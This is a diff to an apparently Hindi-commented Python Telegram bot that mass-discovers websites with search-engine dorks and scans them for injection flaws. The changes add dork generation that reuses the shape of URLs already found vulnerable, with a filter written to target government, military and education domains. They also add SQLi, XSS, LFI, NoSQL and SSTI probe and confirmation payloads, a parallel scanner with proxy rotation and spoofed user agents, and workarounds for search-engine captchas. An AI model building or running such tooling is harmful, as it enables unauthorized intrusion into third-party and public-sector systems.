@@ -70,8 +70,8 @@ BOT_TOKEN = "PUT_YOUR_BOT_TOKEN_HERE"
 ADMIN_IDS = [8999053405]
 ADMIN_USERNAME = "@Bloody_sweet_baby"
 BRAND = "PYTHON SNAKE"
-VERSION = "v2.10.0"
-BUILD = "premium+cfg-safe+guard"   # feature flags — /ping me dikhte hain
+VERSION = "v2.11.0"
+BUILD = "parser-parallel+inj-fast+rev-vuln"   # feature flags — /ping me dikhte hain
 BUILD_TS = "%s"                  # file load hone ka time (deploy check ke liye)
 KEY_RE = re.compile(r"^SNK-[A-Z0-9]{4}-[A-Z0-9]{4}$")
 
@@ -1939,6 +1939,20 @@ def score_keyword(kw: str) -> tuple:
 
 
 # ── URL REVERSE ──────────────────────────────────────────────────────────────
+def host_suffix(host: str) -> str:
+    """example.com → com · site.gov.in → gov.in · shop.co.uk → co.uk"""
+    parts = [x for x in str(host or "").lower().split(".") if x]
+    if len(parts) >= 2 and parts[-2] in ("co", "com", "org", "net", "gov", "ac",
+                                         "edu", "nic", "mil") and len(parts[-1]) == 2:
+        return ".".join(parts[-2:])          # gov.in / co.uk
+    return parts[-1] if parts else ""
+
+
+def suffix_restricted(suf: str) -> bool:
+    """Sirf sarkari/edu suffix hi target karo — .co.uk / .com bahut broad hain."""
+    return str(suf or "").split(".")[0] in ("gov", "mil", "edu", "ac", "nic")
+
+
 def url_reverse(url: str) -> dict:
     """URL ko toda + usse banaye ja sakne wale dorks."""
     raw = (url or "").strip()
@@ -1989,13 +2003,101 @@ def url_reverse_dorks(info: dict, n: int = 20) -> list:
         out.append("filetype:%s inurl:%s" % (e, (f.rsplit(".", 1)[0] if f else "")))
     if h:
         out.append("site:%s" % h)
-    if info.get("tld"):
+    suf = host_suffix(h)
+    if suffix_restricted(suf):
         base = (f.rsplit(".", 1)[0] if f else (p[0] if p else ""))
         if base:
-            out.append("site:.%s inurl:%s" % (info["tld"], base))
+            out.append("site:.%s inurl:%s" % (suf, base))
     if p and f:
         out.append("inurl:%s?%s=" % (f, p[0]))
     return _uniq([x for x in out if x and "inurl:= " not in x])[:n]
+
+
+COMMON_STEMS = ("product", "products", "item", "detail", "details", "page", "view",
+                "news", "article", "blog", "post", "category", "cat", "shop",
+                "store", "listing", "search", "download", "file", "report")
+
+
+def vuln_reverse_dorks(urls, n: int = 90) -> list:
+    """VULNERABLE URL → UHQ dorks (bina keywords).
+
+    Logic: jo URL vulnerable nikla uska *shape* pakdo — same file name,
+    same folder, same parameter, same extension, same TLD — aur wahi shape
+    dhoondho doosri sites par. Keywords ki zarurat nahi, kyunki yahan
+    target "same technology / same structure" hai, koi niche nahi.
+    """
+    out = []
+    for raw in (urls or []):
+        try:
+            info = url_reverse(raw)
+        except Exception:
+            info = {}
+        if not info:
+            continue
+        f = str(info.get("file") or "").strip()
+        ext = str(info.get("ext") or "").strip().lstrip(".")
+        params = [str(x) for x in (info.get("params") or []) if x][:4]
+        dirs = [str(x) for x in (info.get("dirs") or []) if x][:3]
+        host = str(info.get("host") or "").strip()
+        suf = host_suffix(host)
+        d = "/".join(dirs)
+        if d:
+            d += "/"
+        stem = f.rsplit(".", 1)[0] if f else ""
+        q = params[0] if params else ""
+
+        # 1) exact shape — sabse high quality
+        if f and q:
+            out.append('inurl:"%s?%s="' % (f, q))
+            out.append("inurl:%s?%s=" % (f, q))
+        if d and f and q:
+            out.append("inurl:%s%s?%s=" % (d, f, q))
+            out.append("allinurl:%s%s %s=" % (d, f, q))
+        # 2) file + params (bina folder)
+        if f:
+            for prm in params[:3]:
+                out.append("inurl:%s?%s=" % (f, prm))
+            if ext:
+                out.append("inurl:%s ext:%s" % (stem, ext))
+                out.append("inurl:%s ext:%s inurl:%s=" % (f, ext, q or "id"))
+        # 3) same extension + same param (technology match)
+        if ext and q:
+            out.append("inurl:%s= ext:%s" % (q, ext))
+            out.append('inurl:"%s=" ext:%s' % (q, ext))
+        # 4) country suffix (gov.in / co.uk) — .com jaise broad suffix skip
+        if suffix_restricted(suf) and f and q:
+            out.append("site:.%s inurl:%s?%s=" % (suf, f, q))
+            if ext:
+                out.append("site:.%s inurl:%s= ext:%s" % (suf, q, ext))
+        # 5) same folder shape
+        if d and ext:
+            out.append("inurl:%s ext:%s" % (d.strip("/"), ext))
+        # 6) sibling file names — same CMS ke doosre pages
+        if ext and q:
+            for st in COMMON_STEMS[:16]:
+                out.append("inurl:%s.%s?%s=" % (st, ext, q))
+            for prm in params[1:3]:
+                out.append("inurl:%s=%s" % (prm, ext))
+        # 7) error-based — seedhe vulnerable pages (known technique)
+        if f:
+            out.append('intext:"You have an error in your SQL syntax" inurl:%s' % f)
+            out.append('intext:"Warning: mysql_fetch" inurl:%s' % f)
+        # 8) fallback — host ka shape
+        if not (f and q) and host:
+            out.append("site:%s" % host)
+            if ext:
+                out.append("site:%s ext:%s" % (".".join(host.split(".")[-2:]), ext))
+    clean = []
+    seen = set()
+    for d in out:
+        d = re.sub(r"\s+", " ", str(d or "")).strip()
+        if not d or d in seen:
+            continue
+        if re.search(r"inurl:\s*[=?&]|inurl:\s*$|:\s*=", d):
+            continue                      # adhoora dork nahi
+        seen.add(d)
+        clean.append(d)
+    return clean[:max(10, int(n or 90))]
 
 
 # ── RANDOMIZER ───────────────────────────────────────────────────────────────
@@ -2521,15 +2623,36 @@ INJ_PROBES = [
     ("nosql", "{$gt: \"\"}"),               # mongo operator
     ("xss", "\"><svg/onload=alert(1)>"),     # reflection
     ("lfi", "../../../../etc/passwd"),      # traversal
-    ("ssti", "{{7*7}}"),                    # template eval
+    ("ssti", "{{1337*1337}}"),              # template eval — 1787569 unique
     ("redirect", "//example.com/%2f.."),    # open redirect
 ]
 
-SQL_GENERIC = ("sql syntax", "sqlstate", "unterminated", "quoted string",
-               "odbc", "jdbc", "syntax error at or near", "invalid query",
-               "mysql", "postgres", "ora-0", "sqlite", "microsoft ole db")
+# Sirf ASLI error phrases — "mysql"/"sqlite" jaise generic shabd nahi
+SQL_GENERIC = ("you have an error in your sql syntax",
+               "warning: mysql_fetch", "warning: mysqli_", "warning: mysql_",
+               "unclosed quotation mark after the character string",
+               "quoted string not properly terminated",
+               "sqlstate[", "syntax error at or near",
+               "unterminated quoted string", "unterminated string literal",
+               "ora-00933", "ora-01756", "ora-00907",
+               "sqlite error", "sqlite3::", "sqliteexception",
+               "pg_query()", "postgresql error",
+               "microsoft ole db provider", "odbc sql server driver",
+               "invalid query: ", "mysql server version")
 
-LFI_MARKS = ("root:x:0:0", "root:!:0:0", "daemon:x:", "bin/bash", "bin/sh",
+# confirm ke liye doosra payload (same family, different string)
+INJ_CONFIRM = {
+    "sqli": "1)' AND ('1'='2",
+    "union": "-1 UNION SELECT NULL,NULL-- -",
+    "nosql": '{"$ne": null}',
+    "xss": '"><img src=x onerror=alert(1)>',
+    "lfi": "....//....//....//etc/passwd",
+    "ssti": "{{7*7}}",
+    "redirect": "//example.com/%2e%2e",
+    "graphql": 'query{__typename}',
+}
+
+LFI_MARKS = ("root:x:0:0:", "root:!:0:0:", "daemon:x:1:", "bin:/bin/sh",
              "[boot loader]", "for 16-bit app support", "PD9waHA")   # base64 <?php
 
 SSRF_MARKS = ("169.254.169.254", "metadata.google.internal", "instance-identity",
@@ -2566,16 +2689,22 @@ def inj_build_case(raw: str, param: str, payload: str) -> str:
 
 
 def inj_verdict(family: str, payload: str, status: int, headers: dict, body: str,
-                host: str = "") -> dict:
-    """Response dekho — vulnerable hai ya nahi. [] = clean."""
+                host: str = "", baseline: str = "") -> dict:
+    """Response dekho — vulnerable hai ya nahi. {} = clean.
+
+    baseline = bina payload wali same URL ki body. Jo cheez baseline me pehle se
+    hai wo vulnerability NAHI hai (warna har "mysql" likhne wali site vulnerable
+    dikhti thi — wahi 24% false positive ka karan tha).
+    """
     b = str(body or "")[:400000]
     low = b.lower()
+    base_low = str(baseline or "")[:400000].lower()
     loc = str((headers or {}).get("Location") or (headers or {}).get("location") or "")
     hits = dbms_fingerprint(b)
     if family == "nosql":
         for sig in ("MongoError", "unexpected token", "$where", "Cast to ObjectId",
                     "BSONTypeError", "E11000 duplicate key"):
-            if sig.lower() in low:
+            if sig.lower() in low and sig.lower() not in base_low:
                 return {"type": "NoSQL", "dbms": "MongoDB", "evidence": sig}
         if hits:
             db, pat = hits[0]
@@ -2588,31 +2717,31 @@ def inj_verdict(family: str, payload: str, status: int, headers: dict, body: str
                 return {"type": "GraphQL", "dbms": "", "evidence": sig}
         return {}
     if family in ("sqli", "blind", "union", "waf"):
-        if hits:
-            db, pat = hits[0]
-            return {"type": "SQLi", "dbms": db, "evidence": pat}
         for sig in SQL_GENERIC:
-            if sig in low and status in (200, 500):
-                # payload ka key hissa body me ho to hi count karo
-                key = re.sub(r"[^A-Za-z0-9]", "", payload)[:6].lower()
-                if not key or key in low or "syntax" in low:
-                    return {"type": "SQLi", "dbms": "unknown", "evidence": sig}
+            if sig in low and status in (200, 500, 502):
+                db = hits[0][0] if hits else ""
+                return {"type": "SQLi", "dbms": db or "unknown", "evidence": sig}
         return {}
     if family == "xss":
         needle = payload.replace("\\\"", "\"")
-        if needle and needle in b:
-            return {"type": "XSS", "dbms": "", "evidence": "payload reflected in HTML"}
+        if needle and needle in b and needle not in (baseline or ""):
+            return {"type": "XSS", "dbms": "", "evidence": "payload reflected unescaped"}
         return {}
     if family == "lfi":
         for m in LFI_MARKS:
-            if m in b:
+            if m in b and m not in base_low:
                 return {"type": "LFI", "dbms": "", "evidence": "file content: %s" % m[:24]}
-        if "failed to open stream" in low or "include_path" in low:
+        if ("failed to open stream" in low and "failed to open stream" not in base_low) \
+                or ("include_path" in low and "include_path" not in base_low):
             return {"type": "LFI", "dbms": "", "evidence": "include() warning"}
         return {}
     if family == "ssti":
+        if "1337*1337" in payload:
+            if "1787569" in b and "1337*1337" not in b:
+                return {"type": "SSTI", "dbms": "", "evidence": "template evaluated 1337*1337"}
+            return {}
         if "{{7*7}}" in payload or "${7*7}" in payload:
-            if "49" in b and "7*7" not in b[:2000]:
+            if "49" in b and "7*7" not in b[:2000] and "49" not in base_low:
                 return {"type": "SSTI", "dbms": "", "evidence": "template evaluated 7*7=49"}
         return {}
     if family == "ssrf":
@@ -2637,18 +2766,27 @@ INJ_STYLE = {"SQLi": "💉", "NoSQL": "🍃", "GraphQL": "🕸", "XSS": "🧪", 
 async def inj_scan(urls: list, cat: str = "all", progress=None, uid=None,
                    timeout: float = 8.0, conc: int = 40,
                    max_targets: int = 0) -> dict:
-    """ASLI scan — har URL ka har param, payload bhej ke response check karta hai."""
+    """ASLI scan — poore plan ko EK queue me daal ke N workers chalate hain.
+
+    Pehle har URL ke cases alag gather hote the (per-URL barrier) — ek slow URL
+    poore batch ko rok deta tha, isliye 1.8 req/s. Ab flat queue hai.
+    Proxy default OFF (free proxies 90% dead → har request timeout khaati thi).
+    """
     urls = _uniq([u for u in (urls or []) if str(u).startswith("http")])
     probes = inj_probes_for(cat)
     per_url = int(max_targets or sget("inj_targets", 24) or 24)
     st = {"urls": len(urls), "urls_done": 0, "tested": 0, "total": 0,
           "vulns": [], "blocked": 0, "errors": 0, "start": time.time(),
-          "cat": cat, "stopped": 0}
-    # total count (progress ke liye)
-    plan = []
+          "cat": cat, "stopped": 0, "suspected": 0, "skipped": 0,
+          "dead_hosts": [], "proxy": {}, "workers": 0}
+
+    tasks = []                      # (raw, url, family, payload, param)
+    pending = {}
     for raw in urls:
-        info = url_reverse(raw)
-        params = (info.get("params") or [])[:2] or ["id"]
+        try:
+            params = (url_reverse(raw).get("params") or [])[:2] or ["id"]
+        except Exception:
+            params = ["id"]
         cases = []
         for pn in params:
             for fam, pl in probes:
@@ -2659,70 +2797,185 @@ async def inj_scan(urls: list, cat: str = "all", progress=None, uid=None,
                     break
             if len(cases) >= per_url:
                 break
-        plan.append((raw, cases))
+        if not cases:
+            continue
+        pending[raw] = len(cases)
         st["total"] += len(cases)
+        for (u, fam, pl, pn) in cases:
+            tasks.append((raw, u, fam, pl, pn))
 
-    rot = ProxyRotator(enabled=proxy_available())
-    sem = asyncio.Semaphore(max(4, min(80, conc)))
-    seen = set()
+    if not tasks:
+        st["took"] = 0.0
+        return st
+
+    _use_proxy = bool(proxy_available()) and str(
+        sget("inj_proxy", 0) or 0).lower() in ("1", "true", "on", "yes")
+    rot = ProxyRotator(enabled=_use_proxy)
+    st["proxy"] = rot.stats()
+    workers = max(4, min(64, int(conc or 40)))
+    st["workers"] = workers
+    q = asyncio.Queue()
+    for t in tasks:
+        q.put_nowait(t)
     lock = asyncio.Lock()
-    conn = mk_connector(limit=max(10, conc), force_close=True)
+    seen = set()
+    dead_hosts = set()
+    host_fail = defaultdict(int)
+    baselines = {}
+    base_locks = {}
+    px_stat = {"ok": 0, "fail": 0}
+    conn = mk_connector(limit=max(20, workers * 2), force_close=True)
+    sem = asyncio.Semaphore(workers)
+
+    async def _fetch(session, url, px=None, read=65536):
+        kw = {"headers": dict(UA, **{"User-Agent": random.choice(UA_LIST)}),
+              "timeout": aiohttp.ClientTimeout(total=max(3.0, float(timeout))),
+              "ssl": False, "allow_redirects": False}
+        if px:
+            pxc, _h2, _ip2, _s2 = await proxy_connect_url(px)
+            kw["proxy"] = pxc
+        async with session.get(url, **kw) as r:
+            body = ""
+            try:
+                body = (await r.content.read(read)).decode("utf-8", "ignore")
+            except Exception:
+                body = ""
+            return r.status, dict(r.headers), body
+
+    async def _baseline(session, raw):
+        if raw in baselines:
+            return baselines[raw]
+        lk = base_locks.setdefault(raw, asyncio.Lock())
+        async with lk:
+            if raw in baselines:
+                return baselines[raw]
+            body = ""
+            try:
+                _s, _h, body = await asyncio.wait_for(
+                    _fetch(session, raw, rot.next() if rot.enabled else None),
+                    timeout=max(3.0, float(timeout) + 1))
+            except Exception:
+                body = ""
+            baselines[raw] = body
+            return body
+
+    async def _finish(raw):
+        pending[raw] = pending.get(raw, 0) - 1
+        if pending[raw] <= 0:
+            st["urls_done"] += 1
 
     async def one(session, raw, u, fam, pl, pn):
-        if uid and stop_requested(uid):
+        host = urlparse(raw).hostname or ""
+        if host in dead_hosts:
+            async with lock:
+                st["skipped"] += 1
+                await _finish(raw)
             return
         async with sem:
-            if uid and stop_requested(uid):
-                return
-            kw = {"headers": dict(UA, **{"User-Agent": random.choice(UA_LIST)}),
-                  "timeout": aiohttp.ClientTimeout(total=timeout),
-                  "ssl": False, "allow_redirects": False}
-            px = rot.next()
-            if px:
-                pxc, _h2, _ip2, _s2 = await proxy_connect_url(px)
-                kw["proxy"] = pxc
+            px = rot.next() if rot.enabled else None
             try:
-                async with session.get(u, **kw) as r:
-                    body = ""
-                    try:
-                        # sirf pehle 64 KB — error/reflection wahin hote hain
-                        chunk = await r.content.read(65536)
-                        body = chunk.decode("utf-8", "ignore")
-                    except Exception:
-                        body = ""
-                    verdict = inj_verdict(fam, pl, r.status, dict(r.headers), body,
-                                          urlparse(raw).hostname or "")
-                    async with lock:
-                        st["tested"] += 1
-                        if r.status in (403, 429, 503):
-                            st["blocked"] += 1
-                        if verdict:
-                            key = (raw, pn, verdict["type"])
-                            if key not in seen:
-                                seen.add(key)
-                                st["vulns"].append({"base": raw, "url": u, "param": pn,
-                                                    "payload": pl, "type": verdict["type"],
-                                                    "dbms": verdict.get("dbms", ""),
-                                                    "evidence": verdict.get("evidence", ""),
-                                                    "status": r.status})
+                status, hdrs, body = await asyncio.wait_for(
+                    _fetch(session, u, px), timeout=max(4.0, float(timeout) + 2))
+                if px:
+                    px_stat["ok"] += 1
+                    if rot.enabled:
+                        rot.ok(px)
             except Exception:
+                if px:
+                    px_stat["fail"] += 1
+                    if rot.enabled:
+                        rot.dead(px)
+                    # proxy hi kharab hai → 25 fail par direct pe switch
+                    if px_stat["fail"] >= 25 and px_stat["ok"] < 5 and rot.enabled:
+                        rot.enabled = False
+                        logger.warning("inj: proxies dead (%d fail) → direct mode",
+                                       px_stat["fail"])
                 async with lock:
                     st["tested"] += 1
                     st["errors"] += 1
+                    host_fail[host] += 1
+                    if host_fail[host] >= 4 and host not in dead_hosts:
+                        dead_hosts.add(host)
+                        st["dead_hosts"].append(host)
+                    await _finish(raw)
+                return
+            base_body = ""
+            if fam in ("xss", "lfi", "ssti", "nosql"):
+                try:
+                    base_body = await _baseline(session, raw)
+                except Exception:
+                    base_body = ""
+            verdict = inj_verdict(fam, pl, status, hdrs, body, host, base_body)
+            confirmed = bool(verdict)
+            if verdict:
+                # 2nd request — doosre payload se confirm (false positive killer)
+                pl2 = INJ_CONFIRM.get(fam)
+                if pl2 and pl2 != pl:
+                    try:
+                        u2 = inj_build_case(raw, pn, pl2)
+                        if u2:
+                            s2, h2, b2 = await asyncio.wait_for(
+                                _fetch(session, u2, rot.next() if rot.enabled else None),
+                                timeout=max(4.0, float(timeout) + 2))
+                            v2 = inj_verdict(fam, pl2, s2, h2, b2, host, base_body)
+                            confirmed = bool(v2)
+                    except Exception:
+                        confirmed = False
+            async with lock:
+                st["tested"] += 1
+                if status in (403, 429, 503):
+                    st["blocked"] += 1
+                if verdict and not confirmed:
+                    st["suspected"] += 1
+                if confirmed:
+                    key = (raw, pn, verdict["type"])
+                    if key not in seen:
+                        seen.add(key)
+                        st["vulns"].append({"base": raw, "url": u, "param": pn,
+                                            "payload": pl, "type": verdict["type"],
+                                            "dbms": verdict.get("dbms", ""),
+                                            "evidence": verdict.get("evidence", ""),
+                                            "status": status, "confirmed": True})
+                await _finish(raw)
 
-    async with aiohttp.ClientSession(connector=conn) as session:
-        for raw, cases in plan:
+    async def worker(session):
+        while True:
             if uid and stop_requested(uid):
-                st["stopped"] = 1
-                break
-            await asyncio.gather(*[one(session, raw, u, fam, pl, pn)
-                                   for (u, fam, pl, pn) in cases])
-            st["urls_done"] += 1
+                return
+            try:
+                raw, u, fam, pl, pn = q.get_nowait()
+            except asyncio.QueueEmpty:
+                return
+            await one(session, raw, u, fam, pl, pn)
+
+    async def ticker():
+        while not q.empty():
+            if uid and stop_requested(uid):
+                return
+            await asyncio.sleep(1.6)
             if progress:
                 try:
                     await progress(st)
                 except Exception:
                     pass
+        if progress:
+            try:
+                await progress(st)
+            except Exception:
+                pass
+
+    async with aiohttp.ClientSession(connector=conn) as session:
+        _tk = asyncio.create_task(ticker())
+        try:
+            await asyncio.gather(*[worker(session) for _ in range(workers)])
+        finally:
+            _tk.cancel()
+            try:
+                await asyncio.gather(_tk, return_exceptions=True)
+            except Exception:
+                pass
+    if uid and stop_requested(uid):
+        st["stopped"] = 1
     st["took"] = time.time() - st["start"]
     st["by_type"] = {}
     for v in st["vulns"]:
@@ -3350,11 +3603,13 @@ JUNK_HOSTS = {
 JUNK_EXT = {".css", ".js", ".woff", ".woff2", ".ttf", ".eot", ".ico", ".svg", ".png",
             ".jpg", ".jpeg", ".gif", ".webp", ".mp4", ".mp3", ".avi", ".map"}
 
-# 7 engines — jitne rotating proxy ke saath reliable chalte hain
+# 9 engines — bing & mojeek bina proxy bhi chalte hain (v2.11)
 ENGINE_URLS = {
     "ddgl":   "https://lite.duckduckgo.com/lite/?q={q}&s={p}",
     "ddg":    "https://html.duckduckgo.com/html/?q={q}&s={p}",
     "bing":   "https://www.bing.com/search?q={q}&first={p}&count=30&setlang=en",
+    "mojeek": "https://www.mojeek.com/search?q={q}&s={p}",
+    "marginalia": "https://old-search.marginalia.nu/search?query={q}",
     "google": "https://www.google.com/search?q={q}&num=20&hl=en&start={p}&gbv=1",
     "brave":  "https://search.brave.com/search?q={q}&offset={p}&source=web",
     "yandex": "https://yandex.com/search/?text={q}&p={p}&lr=0",
@@ -3371,20 +3626,34 @@ ENGINE_PAGE = {
     "sxng": (1, 1),
 }
 
-ENGINE_ORDER = ["ddgl", "ddg", "bing", "yahoo", "brave", "google", "yandex"]
+# DDG GET pe "anomaly/challenge" deta hai — POST form se asli result aate hain
+ENGINE_POST = {
+    "ddg":  "https://html.duckduckgo.com/html/",
+    "ddgl": "https://lite.duckduckgo.com/lite/",
+}
+
+ENGINE_ORDER = ["bing", "mojeek", "ddgl", "ddg", "yahoo", "brave", "google",
+                "yandex", "marginalia"]
+
+# Challenge / captcha page — ye "0 results" nahi, BLOCK hai
+BLOCK_MARKS = ("anomaly-modal", "anomaly_modal", "unusual traffic", "are you a robot",
+               "captcha", "challenge-form", "cf-challenge", "enable javascript and cookies",
+               "our systems have detected", "verify you are human", "access denied",
+               "ddg-lite__anomaly")
 
 # ── Kitne engines? Termux/phone pe kam = fast. Ye 3 bina proxy bhi chalte hain ──
 ENGINE_SETS = {
     # fast = bina proxy bhi chalta hai (kam = slow net pe bhi jaldi)
-    "fast":   ["ddgl", "ddg", "bing"],
-    # normal = proxy rotation ke saath (recommended)
-    "normal": ["ddgl", "ddg", "bing", "yahoo", "brave"],
-    # max = saare 7 (google/yandex ke liye proxy zaroori)
-    "max":    ["ddgl", "ddg", "bing", "yahoo", "brave", "google", "yandex"],
+    "fast":   ["bing", "mojeek", "ddgl"],
+    # normal = 5 engines — bing + mojeek bina proxy bhi chalte hain
+    "normal": ["bing", "mojeek", "ddgl", "ddg", "yahoo"],
+    # max = 8 (google/yandex ke liye proxy zaroori)
+    "max":    ["bing", "mojeek", "ddgl", "ddg", "yahoo", "brave",
+               "google", "yandex", "marginalia"],
 }
 ENGINE_LABEL = {"fast": "⚡ FAST — 3 engines (no proxy)",
-                "normal": "⚖️ NORMAL — 5 engines (rotate proxy)",
-                "max": "🐢 MAX — 7 engines (proxy needed)"}
+                "normal": "⚖️ NORMAL — 5 engines (bing+mojeek always)",
+                "max": "🐢 MAX — 9 engines (proxy needed)"}
 ENGINE_TIMEOUT = {"fast": 6.0, "normal": 8.0, "max": 10.0}
 ENGINE_DEAD_AFTER = 3          # 3 miss → is run me skip (global state nahi)
 
@@ -3392,6 +3661,14 @@ ENGINE_DEAD_AFTER = 3          # 3 miss → is run me skip (global state nahi)
 NO_PROXY_DEAD = {"google", "yandex"}      # bina proxy ye 2 pakka block
 ENGINE_MISS = {}      # engine -> consecutive empty/blocked count
 ENGINE_LAST = {}      # engine -> (reason, time) — /enginetest + 0-URL card me dikhta hai
+
+
+def looks_blocked(body: str) -> bool:
+    """Page captcha/challenge hai? (200 OK par bhi block ho sakta hai)."""
+    b = str(body or "")[:60000].lower()
+    if not b:
+        return True
+    return any(m in b for m in BLOCK_MARKS)
 
 
 def engine_reason(err: str) -> str:
@@ -3597,10 +3874,15 @@ def extract_urls(engine: str, body: str) -> list:
             out.append(unquote(m.group(1)))
         for m in re.finditer(r'class="result__a"[^>]+href="([^"]+)"', body):
             out.append(_html.unescape(m.group(1)))
+        # lite page ke asli result rows (nav/footer links NAHI)
         for m in re.finditer(r'class="result-link"[^>]*href="([^"]+)"', body):
             out.append(_html.unescape(m.group(1)))
-        if engine == "ddgl":                       # lite page: seedhe links
-            for m in re.finditer(r'<a[^>]+href="(https?://[^"]+)"[^>]*>', body):
+        for m in re.finditer(r'<a[^>]+class="[^"]*result-link[^"]*"[^>]+href="([^"]+)"',
+                             body):
+            out.append(_html.unescape(m.group(1)))
+        if not out:                                # last try: lite table rows
+            for m in re.finditer(r'<a[^>]+href="(https?://[^"]+)"[^>]*'
+                                 r'class="[^"]*(?:result|link)[^"]*"', body):
                 out.append(_html.unescape(m.group(1)))
     elif engine == "bing":
         for m in re.finditer(r'<h2[^>]*>\s*<a[^>]+href="(https?://[^"]+)"', body):
@@ -3686,6 +3968,14 @@ async def fetch_engine(session, engine: str, dork: str, proxy=None,
         target = url.format(q=quote_plus(dork), p=base + int(page) * step)
     except Exception:
         target = url.format(q=quote_plus(dork))
+    post_url = ENGINE_POST.get(engine)
+    post_data = None
+    if post_url:
+        # DDG: POST form (GET pe chup-chaap challenge page aata hai)
+        post_data = {"q": dork, "kl": "us-en"}
+        if int(page):
+            post_data["s" if engine == "ddg" else "dc"] = str(base + int(page) * step)
+        target = post_url
     hdrs = dict(UA)
     hdrs["Referer"] = random.choice(
         ["https://www.google.com/", "https://www.bing.com/", "https://duckduckgo.com/",
@@ -3705,7 +3995,9 @@ async def fetch_engine(session, engine: str, dork: str, proxy=None,
                 continue
             kw["proxy"] = px_conn
         try:
-            async with session.get(target, **kw) as r:
+            _req = (session.post(target, data=post_data, **kw) if post_data
+                    else session.get(target, **kw))
+            async with _req as r:
                 if r.status != 200:
                     last_err = "HTTP %s" % r.status
                     if rot and px and r.status in (403, 407, 429, 502, 503):
@@ -3721,7 +4013,24 @@ async def fetch_engine(session, engine: str, dork: str, proxy=None,
                     ENGINE_LAST[engine] = ("empty body", time.time())
                     engine_miss_add(engine, miss)
                     return []
+                if looks_blocked(body):
+                    last_err = "blocked page (captcha/challenge)"
+                    if rot and px:
+                        rot.dead(px)
+                    if attempt == 3:
+                        ENGINE_LAST[engine] = (last_err, time.time())
+                        engine_miss_add(engine, miss)
+                        return []
+                    continue
                 urls = extract_urls(engine, body)
+                # 1-2 links = nav links, asli results nahi (ddg ka classic dhokha)
+                if urls and len(urls) < 3 and engine in ("ddg", "ddgl", "mojeek"):
+                    last_err = "0 results (nav links only)"
+                    if attempt == 3:
+                        ENGINE_LAST[engine] = (last_err, time.time())
+                        engine_miss_add(engine, miss)
+                        return []
+                    continue
                 if urls:
                     if rot and px:
                         rot.ok(px)
@@ -4341,7 +4650,7 @@ async def parse_deep(dorks: list, max_urls: int = 5000, pages: int = 1,
     except Exception:
         eng_to = ENGINE_TIMEOUT.get(mode, 8.0)
     try:
-        _threads = max(1, min(10, int(sget("parse_threads", 4) or 4)))
+        _threads = max(1, min(10, int(sget("parse_threads", 6) or 6)))
     except Exception:
         _threads = 4
     _esem = asyncio.Semaphore(_threads)
@@ -4354,8 +4663,6 @@ async def parse_deep(dorks: list, max_urls: int = 5000, pages: int = 1,
           "aborted": 0, "wb": 0, "empty_streak": 0, "time_up": 0, "stop": 0,
           "engines_used": len(eng_list), "dead": [], "proxy": rot.stats(),
           "rounds": 0, "per_dork": 0}
-    # BUG 1+3: 100 dorks tak koi abort nahi; abort sirf jab SAARE engines dead ho
-    ABORT_AFTER = max(30, int(sget("parse_abort_after", 100) or 100))
     _t_start = time.time()
     seen, out = set(), []
     _uid = str(ACTIVE_UID.get("uid")) if ACTIVE_UID.get("uid") else None
@@ -4425,123 +4732,145 @@ async def parse_deep(dorks: list, max_urls: int = 5000, pages: int = 1,
                             seen.add(kk)
                             out.append(kk)
 
-        # 3) saare dorks, saare engines — koi early stop nahi
-        gj_budget = min(20, len(dorks))          # free Google — 12s timeout, 20 dork kaafi
+        # 3) saare dorks — PARALLEL workers (ek saath kai dorks)
+        #    Pehle ek-ek dork sequential chalta tha: 5000 dorks = ghante.
+        #    Ab threads = parallel dorks, isliye 3-6x zyada dork cover hote hain.
+        gj_budget = min(20, len(dorks))          # free Google — 20 dork kaafi
         gj_deadline = time.time() + float(sget("gj_window", 45) or 45)   # BUG 6
-        for i, dork in enumerate(dorks, 1):
-            st["scanned"] = i
-            if len(out) >= max_urls:
-                break
-            if _uid and stop_requested(_uid):          # ⛔ STOP button
-                st["stop"] = 1
-                break
-            # ⏱ time budget — 1000 dork pe ghanton na atko, jitna mila wahi de do
-            if budget and (time.time() - _t_start) > budget:
-                st["time_up"] = 1
-                logger.warning("parse_deep: time budget %.0fs — %d dorks pe ruka",
-                               budget, i)
-                break
-            # 🛑 abort sirf tab: itne dorks ho gaye AUR saare engines dead AUR 0 URLs
-            if (not out and i > ABORT_AFTER
-                    and _dead_engines and len(_dead_engines) >= len(eng_list)):
-                st["aborted"] = 1
-                logger.warning("parse_deep: %d dorks, saare engines dead — abort", i)
-                break
-            # free Google — har dork pe page 0 se, budget khatam hone tak
-            if (i <= gj_budget and gj_enabled() and gj_alive()
-                    and time.time() < gj_deadline and len(out) < max_urls):
-                gurls = await gjerm_search(session, dork, pages=min(2, pages))
-                st["raw"] += len(gurls)
-                st["gj"] += len(gurls)
+        _queue = deque(enumerate(dorks, 1))
+        _lock = asyncio.Lock()
+        _ok_count = defaultdict(int)
+        _prog_at = [0.0]
+        _dork_conc = max(2, min(10, int(_threads)))
+
+        async def _call_engine(eng, dork, page, deadline):
+            """Ek engine call — semaphore + hard deadline."""
+            if eng in _dead_engines or time.time() > deadline:
+                return None
+            try:
+                async with _esem:
+                    if eng in _dead_engines or time.time() > deadline:
+                        return None
+                    return await asyncio.wait_for(
+                        fetch_engine(session, eng, dork, None, page=page,
+                                     timeout=eng_to, rot=rot, miss=_miss),
+                        timeout=max(3.0, eng_to + 1.0))
+            except Exception as exc:
+                logger.info("engine %s fail: %s", eng, str(exc)[:70])
+                ENGINE_LAST[eng] = (type(exc).__name__ + ": " + str(exc)[:40],
+                                    time.time())
+                return None
+
+        async def _scan_dork(i, dork):
+            """Ek dork — engines best-first, 2 sources milte hi ruk jao."""
+            got_any = 0
+            dl = time.time() + max(6.0, eng_to * 1.25)
+            added = []
+            order = list(eng_list)
+            order.sort(key=lambda e: (_miss.get(e, 0) >= ENGINE_DEAD_AFTER,
+                                      -_ok_count.get(e, 0), random.random()))
+            if i <= gj_budget and gj_enabled() and gj_alive() and time.time() < gj_deadline:
+                try:
+                    gurls = await asyncio.wait_for(
+                        gjerm_search(session, dork, pages=min(2, pages)), timeout=12)
+                except Exception:
+                    gurls = []
+                async with _lock:
+                    st["raw"] += len(gurls)
+                    st["gj"] += len(gurls)
                 for u in gurls:
                     if strict and not dork_match(u, dork):
-                        st["mismatch"] += 1
-                        st["filtered"] += 1
+                        async with _lock:
+                            st["mismatch"] += 1
+                            st["filtered"] += 1
                         continue
-                    kk = u.split("#")[0]
-                    if kk in seen:
-                        st["junk"] += 1
-                        st["filtered"] += 1
-                        continue
-                    seen.add(kk)
-                    out.append(kk)
-                    if len(out) >= max_urls:
-                        break
